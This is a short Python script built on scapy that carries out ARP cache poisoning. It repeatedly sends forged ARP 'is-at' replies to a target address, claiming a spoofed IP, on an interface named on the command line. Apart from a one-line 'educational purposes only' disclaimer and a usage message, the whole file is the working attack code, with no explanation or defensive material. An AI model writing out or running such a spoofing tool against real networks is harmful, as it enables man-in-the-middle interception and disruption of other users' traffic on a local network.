#!/bin/env python
# -*- coding: utf-8 -*-
# Disclaimer: This tool is for educational purposes only
#             knowledge is not meant for harming others


import sys
import time
from scapy.all import sendp, ARP, Ether


def poison(iface, target, fake, n, s=1):

    ethernet = Ether()
    arp = ARP(pdst=target,
              psrc=fake,
              op="is-at")

    packet = ethernet / arp

    while n:
        sendp(packet, iface=iface)
        n -= 1
        time.sleep(s)


if __name__ == "__main__":

    if len(sys.argv) != 5:
        print("Usage: ptyhon scriptname.py ifname dst fake n")
        sys.exit(1)

    ifname = sys.argv[1]
    dst = sys.argv[2]
    fake = sys.argv[3]
    n = int(sys.argv[4])

    poison(ifname, dst, fake, n)
